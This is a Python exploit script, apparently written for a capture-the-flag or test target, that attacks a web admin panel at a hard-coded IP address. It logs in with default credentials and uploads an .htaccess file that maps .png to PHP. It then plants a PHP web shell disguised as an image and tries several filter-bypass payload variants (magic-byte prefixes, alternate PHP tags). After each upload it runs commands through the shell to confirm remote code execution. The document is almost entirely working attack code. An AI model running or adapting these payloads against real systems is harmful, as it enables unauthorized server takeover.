import urllib.request, urllib.parse, http.cookiejar, re, uuid

BASE = "http://103.163.47.230:33662"
cj = http.cookiejar.CookieJar()
op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
op.addheaders = [("User-Agent", "Mozilla/5.0")]


def req(p, data=None, method=None, ctype=None, raw=False):
    if isinstance(data, dict):
        data = urllib.parse.urlencode(data).encode()
        ctype = ctype or "application/x-www-form-urlencoded"
    h = {"Content-Type": ctype} if data else {}
    r = urllib.request.Request(BASE + p, data=data, headers=h, method=method)
    try:
        resp = op.open(r, timeout=25)
        return resp.status, resp.read()
    except urllib.error.HTTPError as e:
        return e.code, e.read()
    except Exception as e:
        return -1, str(e).encode()


def txt(b):
    return b.decode("utf-8", "replace")


def upload(filename, content, field="avatar", ctype="image/png", extra=None):
    b = "----wb" + uuid.uuid4().hex
    body = f'--{b}\r\n'.encode()
    body += f'Content-Disposition: form-data; name="{field}"; filename="{filename}"\r\n'.encode()
    body += f"Content-Type: {ctype}\r\n\r\n".encode() + content + b"\r\n"
    for k, v in (extra or {}).items():
        body += f'--{b}\r\nContent-Disposition: form-data; name="{k}"\r\n\r\n'.encode() + v.encode() + b"\r\n"
    body += f"--{b}--\r\n".encode()
    s, out = req("/admin/", body, "POST", f"multipart/form-data; boundary={b}")
    t = re.sub(r"\s+", " ", re.sub(r"<[^>]+>", " ", re.sub(r"<style.*?</style>", "", txt(out), flags=re.S)))
    m = re.search(r"已保存：\s*(\S+)", t)
    m2 = re.search(r"(头像已更新|禁止上传[^。]*|仅支持[^。]*)", t)
    print(f"  upload {filename!r:16s} -> {s} saved={m.group(1) if m else '-':40s} {m2.group(1) if m2 else t[:60]}")
    return m.group(1) if m else None


req("/admin/", {"username": "admin", "password": "admin123"}, "POST")

print("=== 1) 写 .htaccess")
p1 = upload(".htaccess", b"AddType application/x-httpd-php .png\n")
s, b = req("/uploads/avatars/.htaccess")
print("   GET .htaccess:", s, b[:120])

print("=== 2) 上传 php 内容的 png")
PHP = b"<?php if(isset($_GET['c'])){system($_GET['c']);} echo 'WBOK'; ?>"
p2 = upload("s.png", PHP)
if p2:
    s, b = req(p2 + "?c=id")
    print("   GET", p2, "?c=id ->", s, b[:300])

print("=== 3) 若被拦，试绕过写法")
for content, fn in [
    (b"<script language='php'>system($_GET['c']);</script>", "s2.png"),
    (b"<?=system($_GET['c'])?>", "s3.png"),
    (b"GIF89a<?php system($_GET['c']); ?>", "s4.png"),
    (b"\x89PNG\r\n\x1a\n<?php system($_GET['c']); ?>", "s5.png"),
    (b"<?PHP system($_GET['c']); ?>", "s6.png"),
    (b"<?php system($_GET['c']);", "s7.png"),
]:
    p = upload(fn, content)
    if p:
        s, b = req(p + "?c=id")
        print("   GET", p, "->", s, b[:200])
